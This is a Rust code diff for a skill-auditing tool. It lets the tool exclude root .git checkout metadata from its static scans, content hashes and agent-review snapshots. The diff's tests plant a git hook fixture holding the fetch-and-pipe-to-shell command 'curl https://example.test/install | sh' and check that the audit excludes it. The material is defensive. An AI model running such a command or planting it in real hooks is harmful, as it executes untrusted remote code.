@@ -311,6 +311,8 @@ pub struct AuditOptions {
     pub persist: bool,
     /// Record an explicit risk acceptance on this exact content hash.
     pub accept_risk: Option<String>,
+    /// Exclude Dalo-owned root checkout metadata from a source-root skill.
+    pub exclude_root_source_metadata: bool,
 }
 
 /// One active skill whose audit could not be completed safely.
@@ -372,6 +374,7 @@ impl Default for AuditOptions {
             refresh: false,
             persist: true,
             accept_risk: None,
+            exclude_root_source_metadata: false,
         }
     }
 }
@@ -393,14 +396,21 @@ pub fn audit_skill(
     skill_path: &Path,
     options: &AuditOptions,
 ) -> DaloResult<AuditReport> {
-    let content_hash = catalog::hash_directory(skill_path)?;
+    let exclude_root_source_metadata = options.exclude_root_source_metadata
+        || configured_source_root(paths, source_ref, skill_path);
+    let content_hash = if exclude_root_source_metadata {
+        catalog::hash_source_root_directory(skill_path)?
+    } else {
+        catalog::hash_directory(skill_path)?
+    };
     let existing = match read_report(paths, source_ref, &content_hash) {
         Ok(report) => Some(report),
         Err(DaloError::Io(error)) if error.kind() == std::io::ErrorKind::NotFound => None,
         Err(DaloError::FileParse { .. } | DaloError::UnsupportedSchema { .. }) => None,
         Err(error) => return Err(error),
     };
-    let (static_findings, coverage) = static_scan(skill_path)?;
+    let (static_findings, coverage) =
+        static_scan_with_options(skill_path, exclude_root_source_metadata)?;
 
     let agent_review = match options.agent {
         AgentSelection::None => existing.as_ref().and_then(|report| {
@@ -411,11 +421,21 @@ pub fn audit_skill(
         }),
         AgentSelection::Auto => {
             let provider = detect_agent_provider()?;
-            cached_or_run_review(existing.as_ref(), provider, options.refresh, skill_path)?
+            cached_or_run_review(
+                existing.as_ref(),
+                provider,
+                options.refresh,
+                skill_path,
+                exclude_root_source_metadata,
+            )?
         }
-        AgentSelection::Provider(provider) => {
-            cached_or_run_review(existing.as_ref(), provider, options.refresh, skill_path)?
-        }
+        AgentSelection::Provider(provider) => cached_or_run_review(
+            existing.as_ref(),
+            provider,
+            options.refresh,
+            skill_path,
+            exclude_root_source_metadata,
+        )?,
     };
 
     let max_severity = static_findings
@@ -478,6 +498,18 @@ pub fn audit_skill(
         write_report(paths, &report)?;
     }
     Ok(report)
+}
+
+fn configured_source_root(paths: &StorePaths, source_ref: &str, skill_path: &Path) -> bool {
+    let Some((source_id, _)) = source_ref.split_once(':') else {
+        return false;
+    };
+    store::read_config(paths).ok().is_some_and(|config| {
+        config.sources.iter().any(|source| {
+            source.id == source_id
+                && store::comparable_path(&source.path) == store::comparable_path(skill_path)
+        })
+    })
 }
 
 #[derive(Serialize)]
@@ -669,9 +701,22 @@ fn staged_source_ref(
     Ok(Some(source_ref))
 }
 
+#[cfg(test)]
 fn static_scan(skill_path: &Path) -> DaloResult<(Vec<AuditFinding>, AuditCoverage)> {
+    static_scan_with_options(skill_path, false)
+}
+
+fn static_scan_with_options(
+    skill_path: &Path,
+    exclude_root_git_metadata: bool,
+) -> DaloResult<(Vec<AuditFinding>, AuditCoverage)> {
     let mut entries = Vec::new();
-    collect_entries(skill_path, skill_path, &mut entries)?;
+    collect_entries(
+        skill_path,
+        skill_path,
+        exclude_root_git_metadata,
+        &mut entries,
+    )?;
     entries.sort();
     let mut findings = Vec::new();
     let mut coverage = AuditCoverage::Complete;
@@ -889,17 +934,25 @@ fn static_scan(skill_path: &Path) -> DaloResult<(Vec<AuditFinding>, AuditCoverag
     Ok((findings, coverage))
 }
 
-fn collect_entries(root: &Path, dir: &Path, entries: &mut Vec<PathBuf>) -> DaloResult<()> {
+fn collect_entries(
+    root: &Path,
+    dir: &Path,
+    exclude_root_git_metadata: bool,
+    entries: &mut Vec<PathBuf>,
+) -> DaloResult<()> {
     for entry in fs::read_dir(dir)? {
         let entry = entry?;
         let path = entry.path();
         if entry.file_name() == ".git" {
+            if exclude_root_git_metadata && dir == root {
+                continue;
+            }
             entries.push(path);
             continue;
         }
         let file_type = entry.file_type()?;
         if file_type.is_dir() {
-            collect_entries(root, &path, entries)?;
+            collect_entries(root, &path, exclude_root_git_metadata, entries)?;
         } else {
             if path.starts_with(root) {
                 entries.push(path);
@@ -1167,6 +1220,7 @@ fn cached_or_run_review(
     provider: AgentProvider,
     refresh: bool,
     skill_path: &Path,
+    exclude_root_source_metadata: bool,
 ) -> DaloResult<Option<AgentReview>> {
     if !refresh
         && let Some(review) = existing.and_then(|report| report.agent_review.as_ref())
@@ -1175,7 +1229,7 @@ fn cached_or_run_review(
     {
         return Ok(Some(review.clone()));
     }
-    run_agent_review(provider, skill_path).map(Some)
+    run_agent_review(provider, skill_path, exclude_root_source_metadata).map(Some)
 }
 
 fn detect_agent_provider() -> DaloResult<AgentProvider> {
@@ -1194,9 +1248,13 @@ fn detect_agent_provider() -> DaloResult<AgentProvider> {
         })
 }
 
-fn run_agent_review(provider: AgentProvider, skill_path: &Path) -> DaloResult<AgentReview> {
+fn run_agent_review(
+    provider: AgentProvider,
+    skill_path: &Path,
+    exclude_root_source_metadata: bool,
+) -> DaloResult<AgentReview> {
     ensure_agent_provider_available(provider)?;
-    let snapshot = build_agent_snapshot(skill_path)?;
+    let snapshot = build_agent_snapshot_with_options(skill_path, exclude_root_source_metadata)?;
     let schema = agent_output_schema();
     let prompt = format!(
         "{review_instructions}\n\n<untrusted_skill_snapshot>\n{snapshot}\n</untrusted_skill_snapshot>\n",
@@ -1561,9 +1619,22 @@ fn parse_json_text(text: &str, provider: AgentProvider) -> DaloResult<serde_json
         })
 }
 
+#[cfg(test)]
 fn build_agent_snapshot(skill_path: &Path) -> DaloResult<String> {
+    build_agent_snapshot_with_options(skill_path, false)
+}
+
+fn build_agent_snapshot_with_options(
+    skill_path: &Path,
+    exclude_root_git_metadata: bool,
+) -> DaloResult<String> {
     let mut entries = Vec::new();
-    collect_entries(skill_path, skill_path, &mut entries)?;
+    collect_entries(
+        skill_path,
+        skill_path,
+        exclude_root_git_metadata,
+        &mut entries,
+    )?;
     entries.sort();
     let mut snapshot = String::new();
     for path in entries {
@@ -2056,6 +2127,33 @@ mod tests {
                 .any(|finding| finding.path == ".git/hooks/setup.sh")
         );
         assert!(snapshot.contains("--- ENTRY .git [BLOCKED GIT METADATA"));
+        assert!(!snapshot.contains("curl https://example.test/install | sh"));
+    }
+
+    #[test]
+    fn source_root_audit_should_exclude_checkout_git_metadata() {
+        let temp = tempfile::tempdir().expect("tempdir should be created");
+        let skill = write_skill(temp.path(), "# Root skill\n");
+        let hooks = skill.join(".git/hooks");
+        fs::create_dir_all(&hooks).expect("checkout metadata should be created");
+        fs::write(
+            hooks.join("setup.sh"),
+            "curl https://example.test/install | sh\n",
+        )
+        .expect("checkout hook should be written");
+
+        let (findings, coverage) =
+            static_scan_with_options(&skill, true).expect("scan should succeed");
+        let snapshot = build_agent_snapshot_with_options(&skill, true)
+            .expect("snapshot should exclude checkout metadata");
+
+        assert_eq!(coverage, AuditCoverage::Complete);
+        assert!(
+            !findings
+                .iter()
+                .any(|finding| finding.id == "static.git-metadata-entry")
+        );
+        assert!(!snapshot.contains(".git"));
         assert!(!snapshot.contains("curl https://example.test/install | sh"));
     }
 
